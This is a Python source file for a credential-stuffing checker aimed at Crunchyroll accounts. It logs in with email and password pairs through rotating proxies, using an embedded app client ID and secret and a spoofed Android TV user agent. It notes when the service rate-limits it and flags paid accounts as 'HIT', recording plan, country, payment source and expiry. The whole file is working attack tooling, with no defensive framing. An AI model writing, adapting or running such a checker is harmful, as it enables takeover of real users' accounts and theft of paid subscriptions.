import re
import time
import json
import uuid
import random
import string
import base64
import requests
from typing import Dict, Any, Optional

CR_MAP = {
    "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AD": "Andorra",
    "AO": "Angola", "AG": "Antigua and Barbuda", "AR": "Argentina", "AM": "Armenia",
    "AU": "Australia", "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas",
    "BH": "Bahrain", "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus",
    "BE": "Belgium", "BZ": "Belize", "BJ": "Benin", "BT": "Bhutan",
    "BO": "Bolivia", "BA": "Bosnia and Herzegovina", "BW": "Botswana", "BR": "Brazil",
    "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso", "BI": "Burundi",
    "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada", "CV": "Cape Verde",
    "CF": "Central African Republic", "TD": "Chad", "CL": "Chile", "CN": "China",
    "CO": "Colombia", "KM": "Comoros", "CG": "Congo", "CD": "DR Congo",
    "CR": "Costa Rica", "CI": "Cote d'Ivoire", "HR": "Croatia", "CU": "Cuba",
    "CW": "Curacao", "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark",
    "DJ": "Djibouti", "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador",
    "EG": "Egypt", "SV": "El Salvador", "GQ": "Equatorial Guinea", "ER": "Eritrea",
    "EE": "Estonia", "ET": "Ethiopia", "FJ": "Fiji", "FI": "Finland",
    "FR": "France", "GA": "Gabon", "GM": "Gambia", "GE": "Georgia",
    "DE": "Germany", "GH": "Ghana", "GR": "Greece", "GD": "Grenada",
    "GT": "Guatemala", "GN": "Guinea", "GW": "Guinea-Bissau", "GY": "Guyana",
    "HT": "Haiti", "HN": "Honduras", "HK": "Hong Kong", "HU": "Hungary",
    "IS": "Iceland", "IN": "India", "ID": "Indonesia", "IR": "Iran",
    "IQ": "Iraq", "IE": "Ireland", "IL": "Israel", "IT": "Italy",
    "JM": "Jamaica", "JP": "Japan", "JO": "Jordan", "KZ": "Kazakhstan",
    "KE": "Kenya", "KI": "Kiribati", "KP": "North Korea", "KR": "South Korea",
    "KW": "Kuwait", "KG": "Kyrgyzstan", "LA": "Laos", "LV": "Latvia",
    "LB": "Lebanon", "LS": "Lesotho", "LR": "Liberia", "LY": "Libya",
    "LI": "Liechtenstein", "LT": "Lithuania", "LU": "Luxembourg", "MO": "Macao",
    "MK": "North Macedonia", "MG": "Madagascar", "MW": "Malawi", "MY": "Malaysia",
    "MV": "Maldives", "ML": "Mali", "MT": "Malta", "MH": "Marshall Islands",
    "MR": "Mauritania", "MU": "Mauritius", "MX": "Mexico", "FM": "Micronesia",
    "MD": "Moldova", "MC": "Monaco", "MN": "Mongolia", "ME": "Montenegro",
    "MA": "Morocco", "MZ": "Mozambique", "MM": "Myanmar", "NA": "Namibia",
    "NR": "Nauru", "NP": "Nepal", "NL": "Netherlands", "NZ": "New Zealand",
    "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria", "NO": "Norway",
    "OM": "Oman", "PK": "Pakistan", "PW": "Palau", "PS": "Palestine",
    "PA": "Panama", "PG": "Papua New Guinea", "PY": "Paraguay", "PE": "Peru",
    "PH": "Philippines", "PL": "Poland", "PT": "Portugal", "PR": "Puerto Rico",
    "QA": "Qatar", "RO": "Romania", "RU": "Russia", "RW": "Rwanda",
    "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia", "SC": "Seychelles",
    "SL": "Sierra Leone", "SG": "Singapore", "SK": "Slovakia", "SI": "Slovenia",
    "SB": "Solomon Islands", "SO": "Somalia", "ZA": "South Africa", "SS": "South Sudan",
    "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan", "SR": "Suriname",
    "SZ": "Eswatini", "SE": "Sweden", "CH": "Switzerland", "SY": "Syria",
    "TW": "Taiwan", "TJ": "Tajikistan", "TZ": "Tanzania", "TH": "Thailand",
    "TL": "Timor-Leste", "TG": "Togo", "TO": "Tonga", "TT": "Trinidad and Tobago",
    "TN": "Tunisia", "TR": "Turkey", "TM": "Turkmenistan", "TV": "Tuvalu",
    "UG": "Uganda", "UA": "Ukraine", "AE": "UAE", "GB": "United Kingdom",
    "US": "United States", "UY": "Uruguay", "UZ": "Uzbekistan", "VU": "Vanuatu",
    "VE": "Venezuela", "VN": "Vietnam", "YE": "Yemen", "ZM": "Zambia",
    "ZW": "Zimbabwe",
}
CR_PLANS = {"1": "FAN", "4": "MEGA FAN", "6": "ULTIMATE FAN"}
CR_CID = "rjs0ltx0dbwkliwxdzdf"
CR_SEC = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"
CR_UA = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
CR_WUA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
          "(KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36")
CR_API = "https://beta-api.crunchyroll.com"

class CrunchyrollChecker:
    def __init__(self, proxy_manager=None):
        self.proxy_manager = proxy_manager

    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        result = {'email': email, 'password': password, 'status': 'FAIL', 'data': {}}
        proxy_str = self.proxy_manager.get_proxy() if self.proxy_manager else None
        session = requests.Session()
        if proxy_str:
            session.proxies = {"http": proxy_str, "https": proxy_str}

        try:
            device_id = str(uuid.uuid4())
            anon_id = str(uuid.uuid4())

            resp = session.post(
                f"{CR_API}/auth/v1/token",
                data={
                    "grant_type": "password",
                    "username": email,
                    "password": password,
                    "scope": "offline_access",
                    "client_id": CR_CID,
                    "client_secret": CR_SEC,
                    "device_type": "Google SDK built for x86",
                    "device_id": device_id,
                    "device_name": "sdk_google_atv_x86",
                },
                headers={
                    "User-Agent": CR_UA,
                    "Accept": "application/json",
                    "Accept-Charset": "UTF-8",
                    "Accept-Encoding": "gzip",
                    "Connection": "Keep-Alive",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "ETP-Anonymous-ID": anon_id,
                    "Request-Type": "SignIn",
                },
                timeout=20
            )

            text = resp.text

            if resp.status_code == 429 or "too_many_requests" in text or "rate limited" in text.lower():
                result['status'] = 'RATE'
                return result

            if any(k in text for k in ("invalid_grant", "invalid_credentials")) or resp.status_code in (401, 400):
                result['status'] = 'INVALID'
                return result

            try:
                data = resp.json()
            except:
                result['status'] = 'ERROR'
                result['error'] = f"JSON parse error ({resp.status_code})"
                return result

            token = data.get("access_token")
            if not token:
                result['status'] = 'ERROR'
                result['error'] = "No access token"
                return result

            def headers():
                return {
                    "Authorization": f"Bearer {token}",
                    "User-Agent": CR_WUA,
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                }

            username = ""
            try:
                r = session.get(f"{CR_API}/accounts/v1/me/multiprofile", headers=headers(), timeout=20)
                m = re.search(r'"username"\s*:\s*"([^"]+)"', r.text)
                if m:
                    username = m.group(1)
            except:
                pass

            r = session.get(f"{CR_API}/accounts/v1/me", headers=headers(), timeout=20)
            try:
                account = r.json()
            except:
                account = {}

            external_id = account.get("external_id", "")
            verified = account.get("email_verified", False)
            account_id = account.get("account_id", "")
            if not username:
                username = account.get("username", email.split("@")[0])

            info = {
                "user": username,
                "verified": "Yes" if verified else "No",
                "plan": "",
                "streams": "",
                "expires": "",
                "renew": "",
                "country": "",
                "payment": "",
                "sku": "",
            }

            if not external_id:
                result['status'] = 'FREE'
                result['data'] = info
                return result

            r = session.get(f"{CR_API}/subs/v1/subscriptions/{external_id}/benefits", headers=headers(), timeout=20)
            benefits_text = r.text

            no_sub = any(x in benefits_text for x in (
                "subscription.not_found", "Subscription Not Found",
                '"total":0', '"subscription_country":""'
            ))
            if no_sub or "concurrent_streams" not in benefits_text:
                result['status'] = 'FREE'
                result['data'] = info
                return result

            result['status'] = 'HIT'

            m = re.search(r'"concurrent_streams\.(\d+)"', benefits_text)
            if m:
                streams = m.group(1)
                info["streams"] = streams
                info["plan"] = CR_PLANS.get(streams, f"PLAN_{streams}")

            m = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', benefits_text)
            if m:
                cc = m.group(1)
                info["country"] = CR_MAP.get(cc, cc)

            m = re.search(r'"source"\s*:\s*"([^"]+)"', benefits_text)
            if m:
                info["payment"] = m.group(1)

            if account_id:
                try:
                    r = session.get(f"{CR_API}/subs/v3/subscriptions/{account_id}", headers=headers(), timeout=20)
                    sub3 = r.text
                    m = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', sub3)
                    if m:
                        info["expires"] = m.group(1)
                    m = re.search(r'"auto_renew"\s*:\s*(true|false)', sub3)
                    if m:
                        info["renew"] = "Yes" if m.group(1) == "true" else "No"
                    m = re.search(r'"sku"\s*:\s*"([^"]+)"', sub3)
                    if m:
                        info["sku"] = m.group(1)
                except:
                    pass

            result['data'] = info
            return result

        except requests.exceptions.ProxyError:
            result['status'] = 'ERROR'
            result['error'] = "Proxy error"
            return result
        except requests.exceptions.Timeout:
            result['status'] = 'ERROR'
            result['error'] = "Timeout"
            return result
        except requests.exceptions.ConnectionError:
            result['status'] = 'ERROR'
            result['error'] = "Connection failed"
            return result
        except Exception as e:
            result['status'] = 'ERROR'
            result['error'] = str(e)[:80]
            return result
